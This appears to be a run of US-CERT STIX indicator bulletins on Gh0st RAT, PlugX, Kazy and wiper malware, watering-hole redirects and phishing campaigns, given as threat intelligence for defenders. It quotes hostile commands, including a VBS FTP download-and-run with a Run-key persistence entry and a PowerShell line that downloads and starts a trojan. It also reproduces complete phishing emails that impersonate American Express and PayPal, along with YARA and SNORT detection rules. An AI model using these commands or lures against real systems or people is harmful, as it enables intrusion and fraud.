This is a Gh0st RAT installer. Upon execution, Pleasantly surprised.exe launched in the process tree and initialized the standard Windows process RunDLL32.exe, which ran the following command: "RUNDLL32.EXE C:\Recycle09102014\GameUpdate.log,LoaderEntry"
The original executable was deleted from the Desktop, then all processes were closed except RunDLL32.exe.
The following folder is added: C:\Recycle09102014
Two files were added: C:\WINDOWS\system32\ky1log.dat C:\Recycle09102014\GameUpdate.log
The .exe file was deleted: C:\Documents and Settings\[User]\Desktop\Pleasantly Surprised.exe
The following registry keys were added to the registry associated with the executing user: HKU\S-1-5-21-1454471165-1644491937-839522115-1003\Software\Microsoft\Windows\CurrentVersion\Explorer\UserAssist\{75048700-EF1F-11D0-9888-006097DEACF9}\Count\HRZR_EHACNGU:P:\Qbphzragf naq Frggvatf\Hfre\Qrfxgbc\Cyrnfnagyl Fhecevfrq.rkr: 0D 00 00 00 06 00 00 00 00 C1 95 DC 87 0E D0 01 HKU\S-1-5-21-1454471165-1644491937-839522115-1003\Software\Microsoft\Windows\ShellNoRoam\MUICache\C:\Documents and Settings\User\Desktop\Pleasantly Surprised.exe: "Setup/Uninstall"

GameUpdate.log was a Gh0st RAT implant that wrote the keylog file ky1log.dat (MD5: AE06380986A7CA48C34B2D2132D35A06) to the %\system32 directory. It sent system information such as service pack and computer name over UDP to www.meitanjiaoyiwang.com:703. The communications contained the static string "ASDFGx".
This Gh0st RAT implant was previously used in related campaigns described in IB-14-10636 and IB-14-10619.
A key log data file created by the Gh0st RAT implant contained the following file properties: Company Name - Kaspersky Lab ZAO Legal Copyright - 2014 Kaspersky Lab ZAO. All Rights Reserved. Legal Trademarks - Registered trademarks and service marks are the property of their respective owners Product Name - Kaspersky Anti-Virus Product Version - 15.0.0.463 File Version - 15.0.0.463 File Description - Kaspersky Anti-Virus Original Filename - avp.exe
According to the report, the displayed file properties may have been added to make the file appear legitimate. No indicator information has been provided regarding this file since it is subject to change based on the user's actions. The file name was reported as ky1log.dat.

stix:STIX_Header.stix:Title: Watering Hole Attack on Legitimate Semiconductor Website Redirects to CVE-2014-6332 Exploit
stix:STIX_Header.stix:Description: On 22 November 2014, malicious redirects were observed on the legitimate manufacturing website scd.co.il. The redirect exploits CVE-2014-6332. If the vulnerability is successfully exploited a file is downloaded from the malicious domain picture.usascd.com.

stix:Indicator.indicator:Description:
This domain resolves to 202.133.23.145.
The similar subdomain www.usascd.com was reported in IB-14-10404.

This subdomain was also reported with this activity. It was reported to resolve to 202.133.23.145.
The similar subdomain www.usascd.com was reported in IB-14-10404.
After exploitation, this file is retrieved from http://picture.usascd.com/kb20140916.rar

This is the HTTP GET request from the redirect on the legitimate site scd.co.il.
GET /google.html HTTP/1.1 Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/x-shockwave-flash, */* Referer: http://www.scd.co.il/ Accept-Language: en-us Accept-Encoding: gzip, deflate User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; BTRS101170; .NET CLR 2.0.50727) Host: picture.usascd.com Connection: Keep-Alive
The code on the malicious website appears to use some of the same variable names as the proof of concept exploit code published by the researcher Yuange1975. This code is referenced in the following blog entry.
http://blog.trendmicro.com/trendlabs-security-intelligence/a-killer-combo-critical-vulnerability-and-godmode-exploitation-on-cve-2014-6332/

This the HTTP GET request to download the file after exploitation.
GET /kb20140916.rar HTTP/1.1 Accept: */* Accept-Encoding: gzip, deflate User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; BTRS101170; .NET CLR 2.0.50727) Host: picture.usascd.com Connection: Keep-Alive

stix:STIX_Header.stix:Title: Spear-Phishing Campaign Using "eFax" Themed Emails Containing Malicious Links
stix:STIX_Header.stix:Description:
On April 21, 2015, US-CERT was notified by a trusted third party of additional indicators from a spear-phishing campaign using "eFax" themed emails containing malicious links.
Of note, previous Indicator Bulletins released by US-CERT related to the "eFax" themed spear-phishing email campaigns are IB-15-20017B, IB-15-20018A, IB-15-20019A, IB-15-20027, IB-15-20031, and IB-15-20034.

marking:Marking_Structure.simpleMarking:Statement: This Indicator Bulletin is provided "as is" for informational purposes only. The Department of Homeland Security (DHS) does not provide any warranties of any kind regarding any information contained within. The DHS does not endorse any commercial product or service, referenced in this bulletin or otherwise. This document is marked TLP: AMBER. Recipients may only share TLP: AMBER information with members of their own organization, and only as widely as necessary to act on that information. For more information on the Traffic Light Protocol, see http://www.us-cert.gov/tlp.

stix:Indicator.indicator:Description: The emails contained malicious links.

EmailMessageObj:Header.EmailMessageObj:Subject: Scanned from a Xerox Multifunction Device
INCOMING FAX REPORT (Scanned from a Xerox Machine)

stix:Indicator.indicator:Description: Malicious link.

stix:STIX_Header.stix:Title: Phishing Email with OC Prep and Notice of Action Theme
stix:STIX_Header.stix:Description: On 24 Sept 2014, a government department reported a phishing email with the subject "OC Prep & ????" that targeted domestic and international government agencies. The malicious file attached to the email attempts to inject malicious code into a legitimate process.

stix:Indicator.indicator:Description:
Email subject translation: OC Prep & Action Information
----- BEGIN EMAIL HEADERS ----- MAIL From:<foklaptak@gmail.com> SIZE=198835 250 2.1.0 Sender OK RCPT To:< > DATA 250 2.1.5 Recipient OK 354 Start mail input; end with <CRLF>.<CRLF> Received: from mail-ig0-f196.google.com (mail-ig0-f196.google.com [209.85.213.196 ]) by with ESMTP id s8O3YdH7022512-s8O3YdH9022512 (version=TLSv1.0 cipher=RC4-SHA bits=128 verify=CAFAIL) for < >; Tue, 23 Sep 2014 23:34:40 -0400 Received: by mail-ig0-f196.google.com with SMTP id h18so1632492igc.11 for < Tue, 23 Sep 2014 20:34:34 -0700 (PDT) DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=gmail.com; s=20120113; h=mime-version:date:message-id:subject:from:to:content-type; bh=wXW4mUYUYAMcdXqHC2PJGlLHe4X9nZDLbzfzPmtlHmI=;  MIME-Version: 1.0 X-Received: by with SMTP id kd10mr8981487igb.5.1411529674423; Tue, 23 Sep 2014 20:34:34 -0700 (PDT) Received: by with HTTP; Tue, 23 Sep 2014 20:34:34 -0700 (PDT) Date: Wed, 24 Sep 2014 11:34:34 +0800 Message-ID: <CAGCMDwe3ZXAz6F0tgMUCr86gyhutqyWCkvDuSxheLz8gmbNn0A@mail.gmail.com> Subject: =?UTF-8?B?T0MgUHJlcCAmIOihjOWLlemgiOefpQ==?= From: [REDACTED] <foklaptak@gmail.com> To: [REDACTED] Content-Type: multipart/mixed; boundary=089e0139fb62d5b4f30503c75cc3 X-FEAS-SPF: PASS / PASS ( ip="209.85.213.196", helo="mail-ig0-f196.google.com", mailFrom="foklaptak@gmail.com" ) ( headerFrom="foklaptak@gmail.com" ) ----- END EMAIL HEADERS -----
When executed, this file creates the file "C:\Users\[USER NAME]\AppData\Local\Temp\word.exe". It then moves it to "C:\Users\[USER NAME]" and renames "word.exe" to "comine.exe".

This file is created in the root of the user's profile (%userprofile%) by "OCPrep.doc". Upon execution of "comine.exe", a new instance of "services.exe" is launched and code is injected into the process. The trojanized process is responsible for calling out to the domain "dnscache.isgre.at" over port 443.
The following registry entry is created to ensure persistence: HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\comine Data: C:\Documents and Settings\Administrator\comine.exe

The file comine.exe (MD5 34544f7442ceae5a390c078971efb364) calls out to this command and control (C2) domain.
The malware issues a DNS query for this domain and then continuously transmits the following HTTP GET request over port 443 using:
GET / HTTP/1.1 Accept: */* Accept-Language: zh-cn User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; MSIE 6.0; Windows NT 5.1) Host: update.microsoft.com/windowsupdate/v6/default.aspx?ln=zh-cn Connection: Keep-Alive

stix:STIX_Header.stix:Title: Aerospace Sector Phishing Emails with Dropbox Theme Create CTFMON Malware
stix:STIX_Header.stix:Description:
On 7 November 2014 a U.S. government department reported observing a series of forwarded emails with a subject line "You've connected an iPad to Dropbox", and an invalid X-Mailer "Microsoft Outlook Express 6.00.2900.5589". The emails were sent using automatic forwarding through a chain of three email addresses, two on the domains of aerospace and defense sector companies and the third belonging to a U.S. government department. All three victim/compromised addresses were associated with the same first and last name and are likely the same person.
The emails contained an HTML link that directs to http://gallosport.com/list/default.html?<UNIQUE ID>

stix:STIX_Header.stix:Title: Pleasantly Surprised Themed Phishing Email
stix:STIX_Header.stix:Description:
On 12 January 2015, a government department was targeted with a phishing email sent with the subject "Pleasantly surprised". The email included the malicious attachment Pleasantly surprised.zip (MD5: 10BB31EE7971062D9DC730719266A22B), which contained the Gh0st remote administration tool (RAT). The Gh0st RAT called back to www.meitanjiaoyiwang.com.
Similar activity was previously described most recently in IB-15-10071.

stix:Indicator.indicator:Description:
--- BEGIN EMAIL HEADER--- Received: from omr-m03.mx.aol.com (omr-m03.mx.aol.com [64.12.143.77]) (using TLSv1 with cipher ADH-AES256-SHA (256/256 bits)) (No client certificate requested)\ by oms-m03.mx.aol.com (AOL Outbound OMS Interface) with ESMTPS id 3EFD338001E3D for <REDACTED>; Mon, 12 Jan 2015 11:43:42 -0500 (EST) Received: from mtaomg-mca02.mx.aol.com (mtaomg-mca02.mx.aol.com [172.26.221.80]) by omr-m03.mx.aol.com (Outbound Mail Relay) with ESMTP id 086E6700370B6; Mon, 12 Jan 2015 11:43:40 -0500 (EST) Received: from core-mpa01h.mail.aol.com (core-mpa01.mail.aol.com [172.27.32.11]) by mtaomg-mca02.mx.aol.com (OMAG/Core Interface) with ESMTP id 7754238000086; Mon, 12 Jan 2015 11:43:38 -0500 (EST) Received: from 174.139.86.74 by webprd-m06.mail.aol.com (10.74.6.158) with HTTP (WebMailUI); 2015-Jan-12 16:43:38 Date: Mon, 12 Jan 2015 11:43:38 -0500 From: <[REDACTED]> To:<[REDACTED]> Message-Id: <14adf077ee0-d40-5868@webprd-m06.mail.aol.com> Subject: Pleasantly surprised MIME-Version: 1.0 Content-Type: multipart/mixed; boundary="----=_Part_25758_386323888.1421081018078" X-MB-Message-Source: WebUI X-MB-Message-Type: User X-Mailer: JAS STD X-Originating-IP: [174.139.86.74] x-aol-global-disposition: S X-SPAM-FLAG: YES X-AOL-VSS-INFO: 5600.1067/98281 X-AOL-VSS-CODE: clean DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=mx.aol.com; s=20140625; t=1421081019; bh=vnUyPhY/OyvJW5nY1l4RKd6S4WkAOfyf0HgfDE5cYyI=; h=From:To:Subject:Message-Id:Date:MIME-Version:Content-Type; b=JsdvRWddp6sYWKwO5ZlN2pnN2bPBiWKiqyy1R92h8ZhsFYT8AOSEdZDqyx2FYXK4j h/m4QspnlBo/GhxsCk8c/0lt/GRQDAIwbKkswCXsHAD1a8ilCrMMUSHDop84KFhf6p 8AAPhWssMm3HBf7mfRIBJuSH8SDeWUbhcwzFTn0M= X-AOL-REROUTE: YES x-aol-sid: 3039ac1add5054b3f9ba0b71
Subject: Pleasantly surprised From: <[REDACTED]> To:<[REDACTED]>; Mon Jan 12 16:43:38 GMT 2015 Attachments: Pleasantly surprised.zip (375916 bytes); --- END EMAIL HEADER---
The attachment is a zip file archive.

The executable file displayed a pixelated "Play Button" icon. When executed, it created a hidden folder C:\Recycle09102014 and created the Gh0st RAT implant DLL "GameUpdate.log". The executable file, also modified the system registry with the implant parameters, executed the newly created DLL, modified the System Registry for persistence of the DLL, executed clean-up commands to delete itself, and then terminated itself.
The following command was issued to execute the DLL: RUNDLL32.EXE C:\Recycle09102014\GameUpdate.log,LoaderEntry
The following command was issued to delete itself: cmd /c ping 127.0.0.1 -n 1&del "C:\Documents and Settings\User\Desktop\Pleasantly surprised.Exe"
The following changes were made to the system: File added: C:\Recycle09102014\GameUpdate.log File deleted: C:\Documents and Settings\User\Desktop\Pleasantly surprised.Exe (Deleted itself) Folder added: C:\Recycle09102014
The following registry values were added: HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\GameInit: 52 55 4E 44 4C 4C 33 32 2E 45 58 45 20 43 3A 5C 52 65 63 79 63 6C 65 30 39 31 30 32 30 31 34 5C 47 61 6D 65 55 70 64 61 74 65 2E 6C 6F 67 2C 4C 6F 61 64 65 72 45 6E 74 72 79 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 HKLM\SYSTEM\ControlSet001\Services\BITS\LoginAddress: "PIXeBZjsQcToRZfgSdr0QcXoRZWnSJrkKg==" HKLM\SYSTEM\ControlSet001\Services\BITS\LoginPort: "zECcKg==" HKLM\SYSTEM\CurrentControlSet\Services\BITS\LoginAddress: "PIXeBZjsQcToRZfgSdr0QcXoRZWnSJrkKg==" HKLM\SYSTEM\CurrentControlSet\Services\BITS\LoginPort: "zECcKg==" Decoded Hex Value: Run\GameInit: RUNDLL32.EXE C:\Recycle09102014\GameUpdate.log,LoaderEntry Decoded Base64 Values: BITS\LoginAddress: 00000000 3c 85 de 05 98 ec 41 c4 e8 45 97 e0 49 da f4 41 <.....A. .E..I..A 00000010 c5 e8 45 95 a7 48 9a e4 2a ..E..H.. * BITS\LoginPort: 00000000 cc 40 9c 2a .@.*

When the Gh0st RAT implant DLL was executed, it loaded the implant configuration parameters from the system registry, then began to communicate on the network. If the victim types on the keyboard, a key logger file 'C:\WINDOWS\system32\ky1log.dat' is created.
Command issued to execute DLL: RUNDLL32.EXE C:\Recycle09102014\GameUpdate.log,LoaderEntry
Registry Values read: HKLM\System\CurrentControlSet\Services\BITS\LoginAddress: PIXeBZjsQcToRZfgSdr0QcXoRZWnSJrkKg== HKLM\System\CurrentControlSet\Services\BITS\LoginPort: zECcKg==
The following network traffic occurred: DNS Request (port 53): www.meitanjiaoyiwang.com TCP connection www.meitanjiaoyiwang.com port 705: 00000000 83 00 00 00 e0 00 00 00 41 53 44 46 47 78 9c 4b ........ ASDFGx.K 00000010 93 5a 59 38 87 81 81 81 15 88 19 81 58 83 8b 81 .ZY8.... ....X... 00000020 81 09 48 07 a7 16 95 65 26 a7 2a 04 24 26 67 2b ..H....e &.*.$&g+ 00000030 18 31 30 08 30 a0 01 05 28 86 ea 7b c9 cc c0 90 .10.0... (..{.... 00000040 06 d4 29 c3 60 01 d6 bf 06 48 28 b0 31 30 f0 1a ..).`... .H(.10.. 00000050 31 c2 b5 30 32 20 d8 77 a0 6a 1e 30 83 ec 63 e1 1..02 .w .j.0..c. 00000060 86 89 fb c4 ad 06 f2 99 0e 32 81 35 30 32 6c 04 ........ .2.502l. 00000070 ca ac 11 48 8e 48 cd 4d cd 41 77 02 31 00 00 ed ...H.H.M .Aw.1... 00000080 3f 12 b6 ?.. 131 bytes
The traffic continued approximately every 10 seconds. The following changes were made to the system: File created: C:\WINDOWS\system32\ky1log.dat File: ky1log.dat Size: 49 bytes MD5: EF52ABC854163B4DBEE33F4EA147FB33 This file is an obfuscated key logger file. The MD5 will be unique to each instance.
The file GameUpdate.log (MD5 91E636CCCE5FC5E9DA25DF7EA5C80900) performs a DNS request. Communications to this Command and Control (C2) domain were observed over port 705.

stix:STIX_Header.stix:Title: Spear-Phishing Emails Using Finance-Related Themes Containing Malicious Attachments or Links
stix:STIX_Header.stix:Description: On May 8, 2015, US-CERT was notified by a trusted third party of a spear-phishing email campaign using finance-related themes containing malicious attachments or links.

marking:Marking_Structure.simpleMarking:Statement: This Indicator Bulletin is provided "as is" for informational purposes only. Recipients may only share TLP: AMBER information with members of their own organization, and only as widely as necessary to act on that information. stix:STIX_Header.stix:Title: American Express Card Themed Emails
stix:STIX_Header.stix:Description: On 31 October 2014 a U.S. government department observed phishing emails with an American Express card theme. The emails used the sender address pkle@boyle.com, and the subject "Important Information About Your Recent Card". Malicious links in the body of the HTML email directed to http://ayerikam-expresz.com.

stix:Indicator.indicator:Description:
----- BEGIN EMAIL HEADER ----- EHLO UUYWTRLJ MAIL FROM: <pkle@boyle.com> RCPT TO: <[REDACTED]> DATA Message-ID: <ORX8XLM6.2144286@boyle.com> Date: Fri, 31 Oct 2014 13:13:30 -0500 From: American Express <AmericanExpress@welcome.aexp.com> User-Agent: Mozilla/5.0 (Windows NT 6.1; rv:24.0) Gecko/20100101 Thunderbird/24.2.0 MIME-Version: 1.0 To: <[REDACTED]> Subject: Important Information About Your Recent Card Content-Type: multipart/alternative; boundary="------------000506040105090303030702" ----- END EMAIL HEADER -----
----- BEGIN EMAIL BODY ----- Important Information About Your Recent Irregular Card Activity Dear Customer According to our records, we recently noticed irregular activity on your AMERICAN EXPRESS Card. We have changed some of the Card information to protect the security of your account. For your convenience, please update your new Card information or the information you may have on file. To update your information please visit: https://americanexpress.com If you have any questions, please contact us using the number on the back of your Card. Sincerely, American Express Customer Care
Contact Customer Service | View Our Privacy Statement | Add Us to Your Address Book Your Card Member information is included in the upper-right corner to help you recognize this as a customer service e-mail from American Express. Using the spam/junk mail function may not block servicing messages from being sent to your email account. To learn more about e-mail security or report a suspicious e-mail, please visit us at americanexpress.com/phishing. We kindly ask you not to reply to this e-mail but instead contact us securely via customer service.
2014 American Express. All rights reserved. AGNEUSCN0006002 ----- END EMAIL BODY -----
It was reported that the email senders likely copied the text of a legitimate American Express customer service email and spoofed a seemingly legitimate sender email address in an effort to better hide the malicious nature of the email.

The HTML link in the email directs to ayerikam-expresz.com, which resolved to IP address 5.9.184.138 as of 31 October 2014. The domain hosts a number of JavaScript scripts of unknown purpose.
Open source reported query:
GET /americanexpress/ HTTP/1.1 Host: ayerikam-expresz.com User-Agent: Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.2.13) Gecko/20101203 Firefox/3.6.13 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: en-us,en;q=0.5 Accept-Encoding: gzip,deflate Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7 Keep-Alive: 115 Connection: keep-alive
Response: 5.9.184.138 HTTP/1.0 200 OK
Content-Type: text/html
Content-Length: 187009 Accept-Ranges: bytes Server: nginx Date: Fri, 31 Oct 2014 17:41:38 GMT Last-Modified: Fri, 31 Oct 2014 17:32:29 GMT Etag: "5453c7ad-2da81" Connection: keep-alive
WHOIS information:

stix:STIX_Header.stix:Title: PayPal Account Themed Phishing Emails
stix:STIX_Header.stix:Description: On 7 November 2014 a U.S. government department observed PayPal account themed phishing emails. The emails contained a malicious link that pointed to the URL http://78.140.140.248/~supports/PayPal/.

stix:Indicator.indicator:Description:
----- BEGIN EMAIL HEADER ----- Subject: Unfortunately your account is temporarily blocked From: Service PayPal <medisaclinic@usalinux.sindad.com>; To: [REDACTED]; Date: Fri Nov 07 18:39:32 GMT 2014 Received: from medisaclinic by usalinux.sindad.com with local (Exim 4.82)(envelope-from <medisaclinic@usalinux.sindad.com>)id 1XmoRY-000RPh-P3for [REDACTED]; Fri, 07 Nov 2014 22:09:32 +0330 X-PHP-Script: medisaclinic.com/mailer.php for 5.231.205.155 Message-ID: <a56dc8d073ad8f9169cad2af9fb88777@medisaclinic.com> X-Priority: 3 MIME-Version: 1.0 Content-Transfer-Encoding: quoted-printable Content-Type: text/html; charset="us-ascii" X-AntiAbuse: This header was added to track abuse, please include it with any abuse report X-AntiAbuse: Primary Hostname - usalinux.sindad.com X-AntiAbuse: Original Domain - [REDACTED] X-AntiAbuse: Originator/Caller UID/GID - [1528 500] / [47 12] X-AntiAbuse: Sender Address Domain - usalinux.sindad.com X-Get-Message-Sender-Via: usalinux.sindad.com: authenticated_id: medisaclinic/only user confirmed/virtual account not confirmed X-Source: X-Source-Args: /usr/sbin/proxyexec -q -d -s /var/run/proxyexec/cagefs.sock/socket /bin/cagefs.server X-Source-Dir: medisaclinic.ir:/public_html X-From-Rewrite: rewritten was: [paypal@support.com], actual sender is not the same system user ----- END EMAIL HEADER -----
----- BEGIN EMAIL BODY -----
From: medisaclinic@usalinux.sindad.com To: [REDACTED] Date: Fri Nov 07 18:39:32 GMT 2014 Subject: Unfortunately your account is temporarily blocked Attachment: (No Attachment) Unfortunately , Your account is temporarily blocked please follow the instructions below
Dear PayPal Customer, PayPal is constantly working to ensure security by regularly screening the accounts in our system. We recently reviewed your account, and we need more information to prove your ownership . to help us to provide you with a secure service. Until we can collect this information, your access to sensitive account features will be limited. We would like to restore your access as soon as possible, and we apologize for the inconvenience. Why is my account access limited? we have reason to believe that your account was accessed by a third party. Because protecting the security of your account is our primary concern, we have limited access to sensitive PayPal account features. We understand that this may be an inconvenience but please understand that this temporary limitation is for your protection. How can i get my account fully restored ? Please follow the link below and login to your account then review your account information Confirm now Sincerlye ,PayPalcustomer department! ----- END SAMPLE EMAIL BODY ----

EmailMessageObj:Header.EmailMessageObj:Subject: Unfortunately your account is temporarily blocked

stix:Indicator.indicator:Description: The phishing email contains HTML with a link to http://78.140.140.248/~supports/PayPal/.

stix:STIX_Header.stix:Title: Systems Observed Attempting to Download Malware Following Redirects
stix:STIX_Header.stix:Description: On 17 November 2014, users from a US Government Department were redirected from one legitimate foreign government website to another. The redirected systems then attempted to download malware from IP 118.193.149.186, which contained an exploit for a Microsoft Windows vulnerability (CVE-2014-6332).

stix:Indicator.indicator:Description:
On 17 November 2014, at least two US Government systems attempted to download malware from an IP address registered in China after they visited a compromised foreign government website. The users were redirected to another foreign government website.
The two US Government systems attempted to perform a File Transfer Protocol (FTP) download of the file alg.exe from IP 118.193.149.186, which contained an exploit for vulnerability CVE-2014-6332.
The systems were redirected to the website of the Myanmar Ministry of Foreign Affairs, www.mofa.gov.mm, after visiting www.mewashingtondc.com, which is the official website of the Myanmar embassy in Washington, D.C. The following redirect occurred from www.mewashingtondc.com to www.mofa.gov.mm:
src="http://www.mofa.gov.mm/" height="615" width="1007" style="-webkit-transform:scale(0.58);-moz-transform:scale(0.58);-ms-transform:scale(0.58); transform:scale(0.58); position:relative; left:-210px; top:-130px;"
The following malicious Virtual Basic Script (VBS) variables were hosted at www.mofa.gov.mm: shell.ShellExecute "cmd.exe", "/c echo open 118.193.149.186 > o &echo user admin admin >> o &echo get alg.exe C:\alg.exe >> o &echo quit >> o &ftp -n -s:o &del /F /Q o",0,,0 set ws = createobject("wscript.shell") ws.regwrite "HKLM\SoftWare\Microsoft\Windows\CurrentVersion\Run\newrun","c:\alg.exe -local","REG_SZ"
According to the report, redirection techniques to websites hosting CVE-2014-6332 exploit code are not specific to any group of attackers. It is likely that the initial redirect was legitimate; both are official sites related to a foreign government's legitimate foreign affairs interests. However, not all visitors to the first site were automatically redirected to the other.

stix:STIX_Header.stix:Title: CORRECTED - Invoice Themed Phishing Email Attempts to Deliver Kazy Trojan
stix:STIX_Header.stix:Description:
This update to IB-15-10109 corrects an IP address indicator (95.163.121.186) that was incorrectly entered into the original product.
On 11 February 2015, a U.S. government department was targeted with a phishing email with the subject "Your latest e-invoice from REDROW". The email has a malicious attachment that attempts to deliver two trojan files. One of the files is a variant of Kazy Trojan. The malware exfiltrates the data from the compromised hosts by sending .gzip compressed files to the Russian IP 95.163.121.186 (Cridex Trojan).

stix:Indicator.indicator:Description:
--- BEGIN EMAIL DETAILS --- MIME-Version: 1.0 Date: Wed, 11 Feb 2015 17:46:23 +0700 Delivered-To: [REDACTED] Message-ID: [REDACTED] Subject: Your latest e-invoice from REDROW From: [REDACTED] <Jane.3bea@daily-helper.com> To: [REDACTED] Content-Type: multipart/mixed; boundary=001a22150B1162B579BF591C7C15 --- END EMAIL DETAILS ---
The email body is the same in all the emails with the exception of varying spoofed company names being used.
--- BEGIN EMAIL BODY --- Dear Valued Customer, Please find attached your latest invoice that has been posted to your online account. You'll be pleased to know that your normal payment terms still apply as detailed on your invoice. Rest assured, we operate a secure system, so we can confirm that the invoice DOC originates from REDROW and is authenticated with a digital signature. Thank you for using e-invoicing with REDROW - the smarter, faster, greener way of processing invoices. --- END EMAIL BODY ---

The Microsoft Word document opens the Command Prompt (cmd.exe) and executes a command to download a variant of the Kazy Trojan (file name: pJIOfdfs.exe MD5: C9678EE6A19547FB213126FBA9F6036D) from the Russian IP address 95.163.212.216.
The following command was executed by the MS Word document: cmd /K PowerShell.exe(New-Object System.Net.WebClient).DownloadFile('http://95.163.121.216/hhacz45a/mnnmz.php','%TEMP%\pJIOfdfs.exe');Start-Process'%TEMP%\ pJIOfdfs.exe'
The file 6560KH.doc (MD5: D49D1AEDC0151527C5B67855EE55FC1B) contains a command to download variant of the Kazy Trojan from this location.
The file is a variant of a Kazy Trojan, it creates the executable file edg119.exe (MD5 68B478D4EECD434E6A04846A7F2E32E9).
This file sends encoded data to the Russian IP address 95.163.121.186 on port 443, using HTTP POST requests to multiple URLs.
The file edg119.exe (MD5: 68B478D4EECD434E6A04846A7F2E32E9) sends encoded data to this IP address over port 443.
This URL was observed being requested from a compromised system.

stix:STIX_Header.stix:Title: Wiper Malware Indicators and Signature
stix:STIX_Header.stix:Description:
On 15 February 2015, malicious files were identified as wiper malware. The malware can clear, overwrite, and delete files, and run a service to listen for connections on TCP port 379.
The following Yara rule can detect the malicious file wzcmgrs.dll (MD5: fcf3702e52ae32c995a36f7516c662b7).
strings: $STR2 = {8A 04 17 8B FB 34 A7 46 88 02 83 C9 FF} condition: (uint16(0) == 0x5A4D or uint16(0) == 0xCFD0 or uint16(0) == 0xC3D4 or uint32(0) == 0x46445025 or uint32(1) == 0x6674725C) and $STR2

stix:Indicator.indicator:Description:
Import hash: b920ed1f6f31525a4746573860ba997c Compile Time: 2014-12-20 20:29:09
This file is a wiper malware variant first identified in December. When the file is launched it clears and deletes the SYSTEM, Security, Application, and Setup event logs. It then overwrites and deletes files in the C:\ directory, including profiles and necessary system files. The malware accomplishes this by identifying the extension type of the file, adding garbage bytes (0xCD) to the file, saving the file and then deleting it. The malware overwrites the data before deletion, which usually prevents recovery for forensic purposes.
The kernel driver usbdrv3.sys was written to the user's Temp directory and installed on the system as the service "USB 3.0 Host Controller". The malware used the driver to gain access to the file system to delete it.

Import hash: ff9576bd8cea89d6ff812370267e3e9b Compile Time: 2015-01-20
This file installs the malware implant C:\WINDOWS\system32\wzcmgrs.dll (MD5: fcf3702e52ae32c995a36f7516c662b7).

Import hash: 4d969eacc68441bacce71ddc5b9354e9 Compile Time: 2015-01-19
This implant runs as Wireless Zero Service and listens for connections on TCP port 379.
According to the report, the attackers frequently recompile and modify existing tools to evade detection by network defense systems and anti-virus applications. No significant changes were identified in the malware at the time of the report.
The following Yara rule can detect this implant file:
strings: $STR2 = {8A 04 17 8B FB 34 A7 46 88 02 83 C9 FF} condition: (uint16(0) == 0x5A4D or uint16(0) == 0xCFD0 or uint16(0) == 0xC3D4 or uint32(0) == 0x46445025 or uint32(1) == 0x6674725C) and $STR2

stix:STIX_Header.stix:Title: Unique Plugx Malware Variant Communicates Using Unique HTTP POST Requests
stix:STIX_Header.stix:Description:
On or around 15 April 2015, a U.S. Government Agency reported a unique malware variant that communicates over HTTP POST requests using custom x-headers that contain the letters "LZ". The malware implant communicates over ports 80 and 443. These command and control (C2) domains for the PlugX "LZ" variant were used from March to April of 2015. It has yet to be determined how initial access was gained to the C2 infrastructure.
Web servers are considered at the greatest risk to this malware due to their public accessibility.

stix:Indicator.indicator:Description:
This mitigation technique below should be customized to each individual environment but provides basic SNORT rule structure as a base for the PlugX "LZ" variant's communications:
----------Begin SNORT Signature---------- alert tcp any any -> any [80,443] (msg:"PLUGX malware variant beacon"; content:"POST"; http_method; content:"|0d 0a|LZ-ID|3a 20|"; content:"|0d 0a|LZVer| 3a 20|"; content:"|0d 0a|LZ-Compress|3a 20|"; content:"|0d 0a|LZ-Size|3a 20|"; content:"|0d 0a|Host|3a 20|"; sid: 1; rev: 1;) ---------End SNORT Signature-------------

The following HTTP POST request is unique to this "LZ" variant:
POST /C115FA70B3348649BD2FCF9F HTTP/1.1 Accept: */* LZ-ID: 0 LZ-Ver: 0 LZ-Compress: 61456 LZ-Size: 1 User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; .NET CLR 3.0.04506.648; .NET CLR 3.5.21022; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET4.0C; .NET4.0E) Host: U.S. IP Address #1 Content-Length: 0 Connection: Keep-Alive Cache-Control: no-cache

The following HTTP POST request is unique to this "LZ" variant:
POST /C115FA70B3348649BD2FCF9F HTTP/1.1 Accept: */* LZ-ID: 0 LZ-Ver: 0 LZ-Compress: 61456 LZ-Size: 1 User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; .NET CLR 3.0.04506.648; .NET CLR 3.5.21022; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET4.0C; .NET4.0E) Host: U.S. IP Address #1 Content-Length: 0 Connection: Keep-Alive Cache-Control: no-cache

stix:STIX_Header.stix:Title: Payload Identified from a Bash Shellshock Attack
stix:STIX_Header.stix:Description:
